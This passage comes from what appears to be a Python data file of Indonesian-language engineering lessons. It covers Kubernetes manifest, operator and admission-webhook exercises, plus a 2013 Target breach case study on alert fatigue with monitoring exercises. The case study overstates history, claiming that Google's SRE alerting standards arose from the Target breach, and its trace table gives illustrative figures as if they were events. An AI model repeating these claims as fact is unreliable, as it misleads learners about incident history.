- **Tugas**: Bangun manifes deklaratif Kubernetes (YAML) lengkap untuk aplikasi web stateless berkeandalan tinggi yang memuat Deployment (3 replika, strategi `RollingUpdate` dengan `maxSurge: 1` dan `maxUnavailable: 0`), Service bertipe `ClusterIP`, penegakan kuota `resources` (requests dan limits), serta konfigurasi pemeriksaan kesehatan *Liveness Probe* dan *Readiness Probe* berbasis HTTP endpoint.
- **Petunjuk Perancangan Arsitektur**:
  - Readiness probe memverifikasi kesiapan koneksi basis data sebelum menerima lalu lintas.
  - Liveness probe mendeteksi apakah proses mengalami deadlock/hang dan me-restart kontainer otomatis.
- **Test Vector & Kasus Uji Ekstrem**:
  - *Validasi Skema*: Uji manifes dengan utilitas linter `kubeval` atau `kubectl --dry-run=client`; pastikan seluruh atribut mematuhi skema OpenAPI Kubernetes resmi tanpa peringatan sintaks.
- **Rubrik Penilaian Mandiri**: 40% Kelengkapan Manifes Kubernetes Sesuai Praktik Terbaik, 30% Konfigurasi Liveness/Readiness Probe yang Tepat, 30% Strategi RollingUpdate Bebas Downtime.

### Tingkat 2: Menengah
- **Tugas**: Kembangkan pengontrol rekonsiliasi mini (*Custom Kubernetes Controller / Operator Loop*) dalam Python/Go menggunakan pola *Informer & Workqueue* yang memantau pembuatan objek kustom (*Custom Resource Definition / CRD*), membandingkan status aktual terhadap status yang diinginkan, dan secara otomatis membuat Pod baru jika jumlah replika fisik kurang dari spesifikasi.
- **Petunjuk Perancangan Arsitektur**:
  - Terapkan fungsi rekonsiliasi idempoten: `Reconcile(Request) -> Result`.
  - Gunakan mekanisme exponential backoff pada workqueue saat terjadi kegagalan pembaruan status.
- **Test Vector & Kasus Uji Ekstrem**:
  - *Simulasi Self-Healing*: Hapus 1 Pod yang dikelola operator secara manual via API; buktikan kontroler mendeteksi penyimpangan status (*drift*) dan membuat 1 Pod pengganti baru secara otomatis dalam waktu $< 2\text{ detik}$.
- **Rubrik Penilaian Mandiri**: 40% Arsitektur Reconciliation Loop Controller yang Tepat, 30% Sifat Idempoten Rekonsiliasi Status CRD, 30% Kemampuan Self-Healing Terverifikasi.

### Tingkat 3: Mahir
- **Tugas**: Rancang webhook penerimaan mutasi dan validasi (*Admission Webhook Server*) dalam Go/Python untuk Kubernetes API Server yang memeriksa setiap Pod yang akan dibuat di kluster, menolak pembuatan Pod jika tidak memiliki batas memori (*Memory Limits Validation*), dan secara otomatis menyuntikkan kontainer pendamping keamanan (*Security Sidecar Container Injection*) ke dalam spesifikasi Pod sebelum disimpan ke etcd.
- **Petunjuk Perancangan Arsitektur**:
  - Bangun endpoint HTTPS bertipe `MutatingAdmissionWebhook` dan `ValidatingAdmissionWebhook`.
  - Hasilkan patch mutasi dalam format JSONPatch (RFC 6902) untuk menyuntikkan kontainer sidecar.
- **Test Vector & Kasus Uji Ekstrem**:
  - *Penolakan Pod Cacat*: Ajukan pembuatan Pod tanpa field `resources.limits`; buktikan webhook menolak pembuatan Pod dengan pesan: `Admission denied: Seluruh kontainer wajib memiliki memory limit!`.
- **Rubrik Penilaian Mandiri**: 40% Kepatuhan Protokol AdmissionReview Kubernetes API, 30% Penyusunan Mutasi JSONPatch RFC 6902 yang Presisi, 30% Penegakan Kebijakan Keamanan Kluster."""
    },

    156: {
        "trace": r"""#### Tabel Penelusuran Siklus Hidup Alarm Telemetri & Kejenuhan Notifikasi (Alert Fatigue)
| Volume Metrik / Log per Detik | Jumlah Aturan Alarm Aktif (Peringatan) | Frekuensi Notifikasi Pager per Jam | Reaksi Tim Operasi (Insinyur On-Call) | Tingkat Kejenuhan Alarm (*Alert Fatigue*) | Status Deteksi Serangan Siber Riil |
|---|---|---|---|---|---|
| Operasi Awal | 50 Metrik Terpilih | 1 Notifikasi per hari | Investigasi mendalam setiap insiden | 0% (Sangat Waspada) | Respons cepat $< 15\text{ menit}$ |
| Ekspansi Sistem | 1.000 Alarm Statis Dibuat | 25 Notifikasi per jam | Sebagian besar adalah false alarm | 40% (Mulai Terbiasa) | Ambang batas mulai diabaikan |
| Kejenuhan Parah | Ambang batas CPU > 80% membunyikan pager | **120 NOTIFIKASI PER JAM! (1 Alarm tiap 30 detik)**| Insinyur mematikan suara pager / buat aturan mute | **95% FATIGUE: Seluruh alarm diabaikan!** | Sinyal bahaya tenggelam dalam kebisingan |
| Serangan Siber Riil | Peretas membobol server POS | Sistem keamanan menyalakan alarm merah | Alarm berbunyi di tengah 500 alarm bising lain | Operator mengira ini false alarm rutin | **PEMBOBOLAN DIBIARKAN BERLANGSUNG 3 MINGGU!** |
| Mitigasi SRE Modern | SLO-Based Alerting (Burn-Rate Alerting)| Alarm hanya berbunyi jika Error Budget terkuras | Eliminasi 99% alarm bising tak berguna | 5% (Kewaspadaan Tinggi Pulih) | Serangan riil tertangani seketika |""",
        "postmortem": {
            "title": "Studi Kasus Kegagalan Nyata: Pembobolan Siber 40 Juta Kartu Kredit Target Corp Akibat Kejenuhan Alarm Telemetri (Alert Fatigue, 2013)",
            "chronology": r"""- **Kronologi & Konteks Sejarah**: Antara 27 November dan 15 Desember 2013, raksasa ritel Amerika Serikat Target Corporation mengalami salah satu peretasan data kartu kredit terbesar dalam sejarah ritel: data 40 juta kartu kredit nasabah dan informasi pribadi 70 juta pelanggan dicuri dari mesin kasir (*Point-of-Sale / POS*), mengakibatkan kerugian finansial lebih dari 200 juta dolar dan pengunduran diri CEO serta CIO perusahaan.
- **Akar Masalah Observabilitas Sistem, SRE, & Alert Fatigue**: Perangkat lunak deteksi keamanan canggih buatan FireEye yang terpasang di jaringan Target sebenarnya telah mendeteksi aktivitas peretas saat malware pertama kali ditanam di server POS dan menyalakan alarm peringatan keamanan tingkat tinggi. Namun, tim pusat operasi keamanan (SOC) Target dibanjiri oleh ribuan notifikasi alarm palsu (*False Positives*) setiap hari akibat penetapan ambang batas peringatan yang terlalu sensitif dan ketiadaan korelasi peringatan cerdas. Karena mengalami fenomena *Alert Fatigue* (kejenuhan kognitif di mana manusia menjadi kebal dan mengabaikan peringatan yang berulang-ulang), para analis keamanan mengabaikan alarm kritis tersebut dan menganggapnya sebagai anomali rutin biasa. Peretas leluasa mengekstrak jutaan data kartu kredit selama berminggu-minggu tanpa hambatan hingga akhirnya Target diberitahu oleh Departemen Kehakiman AS.""",
            "snippet": r"""```python
# Analisis Kejenuhan Alarm: Rasio Signal-to-Noise pada Sistem Pemantauan
def analyze_alert_fatigue(total_alerts_per_day, true_positive_incidents):
    false_positives = total_alerts_per_day - true_positive_incidents
    noise_ratio = false_positives / float(total_alerts_per_day)

    print(f"Total Notifikasi per Hari:  {total_alerts_per_day}")
    print(f"Insiden Berbahaya Nyata:    {true_positive_incidents}")
    print(f"Rasio Kebisingan (Noise):   {noise_ratio:.2%}")

    if noise_ratio > 0.95:
        print("BAHAYA SRE: Terjadi Alert Fatigue Ekstrem! Operator dipastikan mengabaikan alarm kritis!")

# Pada sistem dengan 5.000 alarm per hari dan hanya 2 insiden nyata:
analyze_alert_fatigue(total_alerts_per_day=5000, true_positive_incidents=2)
# Rasio kebisingan 99.96% menjamin sinyal bahaya riil akan terlewatkan!
```""",
            "analysis": r"""- **Analisis Forensik & Rekayasa Modern**: Tragedi Target mengubah filosofi observabilitas dan manajemen insiden SRE modern secara fundamental. Google dan pakar SRE menerbitkan standar baru penanganan alarm: (1) Larangan membunyikan pager manusia untuk metrik kapasitas statis (seperti CPU > 80%); (2) Penerapan *SLO-Based Burn-Rate Alerting* di mana alarm hanya berbunyi jika terjadi pelanggaran Service Level Objective (SLO) yang mengancam *Error Budget* pelanggan riil; (3) Aturan emas SRE: *Every alert must be actionable*—jika suatu notifikasi tidak memerlukan tindakan perbaikan mendesak oleh manusia saat itu juga, notifikasi tersebut tidak boleh menjadi alarm peringatan."""
        },
        "exercise": r"""### Tingkat 1: Dasar
- **Tugas**: Bangun modul pengekspor metrik aplikasi (*Prometheus Metric Exporter*) mandiri dalam Python menggunakan pustaka resmi `prometheus_client` yang mengekspos 3 jenis metrik standar: Counter (`http_requests_total` dengan label status kode), Gauge (`active_websocket_connections`), dan Histogram (`http_request_duration_seconds` dengan bucket latensi standar) pada endpoint HTTP `/metrics`.
- **Petunjuk Perancangan Arsitektur**:
  - Format data keluaran harus mematuhi spesifikasi teks Prometheus / OpenMetrics secara presisi.
- **Test Vector & Kasus Uji Ekstrem**:
  - *Inspeksi /metrics*: Lakukan kueri HTTP `GET /metrics`; pastikan metrik mencakup baris `# HELP` dan `# TYPE`, serta nilai counter bertambah secara akurat setelah pemrosesan request.
- **Rubrik Penilaian Mandiri**: 40% Kepatuhan Format Ekspos Teks OpenMetrics Prometheus, 30% Penggunaan Counter, Gauge, dan Histogram yang Tepat, 30% Kerapian Enkapsulasi Kode.

### Tingkat 2: Menengah
- **Tugas**: Kembangkan kalkulator pembakaran anggaran kesalahan (*Error Budget Burn Rate Calculator*) dalam Python yang mengimplementasikan metodologi Google SRE untuk layanan dengan target ketersediaan SLO 99.9% (tiga sembilan / $0.1\%$ toleransi kesalahan dalam jendela bergulir 30 hari), menghitung konsumsi error budget saat ini, dan memicu alarm bertingkat berdasarkan laju pembakaran (*Burn Rate $14.4\times$* untuk konsumsi 2% budget dalam 1 jam).
- **Petunjuk Perancangan Arsitektur**:
  - Total Error Budget: $0.001 \times \text{Total Requests}$.
  - Hitung laju pembakaran: $\text{Burn Rate} = \text{Tingkat Kesalahan Aktual} / (1 - \text{SLO})$.
- **Test Vector & Kasus Uji Ekstrem**:
  - *Evaluasi Lonjakan Error*: Layanan mengalami lonjakan error $1.44\%$ dalam 1 jam; buktikan kalkulator mendeteksi Burn Rate tepat $14.4\times$ dan memicu alarm PagerDuty prioritas tinggi.
- **Rubrik Penilaian Mandiri**: 40% Formula Matematika Google SRE Multiwindow Multi-Burn-Rate yang Tepat, 30% Perhitungan Konsumsi Error Budget yang Akurat, 30% Klasifikasi Prioritas Pager.

### Tingkat 3: Mahir
- **Tugas**: Rancang modul pelacakan terdistribusi (*Distributed Tracing Context Propagation Engine*) dalam Go/Python yang mematuhi spesifikasi *W3C TraceContext* (`traceparent` header format: `version-trace_id-parent_id-trace_flags`), mampu menyuntikkan ID jejak global ke dalam header permintaan HTTP keluar dan mengekstraknya di layanan hilir untuk merekonstruksi pohon jejak pemanggilan (*Span Dependency Tree*).
- **Petunjuk Perancangan Arsitektur**:
  - Format `traceparent`: `00-4bf92f3577b34da6a3ce929d0e0e4736-00f067aa0ba902b7-01`.
  - Teruskan trace ID yang sama di seluruh layanan dan hasilkan span ID baru per-segmen pemanggilan.
- **Test Vector & Kasus Uji Ekstrem**:
  - *Rekonstruksi Pohon Jejak*: Lacak alur transaksi melintasi 3 layanan independen (Gateway $\to$ Order $\to$ Payment); buktikan ketiga span memegang `trace_id` yang identik persis dan relasi `parent_span_id` tersusun membentuk hierarki pohon yang benar.
- **Rubrik Penilaian Mandiri**: 40% Kepatuhan Spesifikasi Standar W3C TraceContext RFC, 30% Perambatan Konteks Pelacakan Lintas Layanan yang Mulus, 30% Rekonstruksi Pohon Jejak Terdistribusi Akurat."""
    }
}
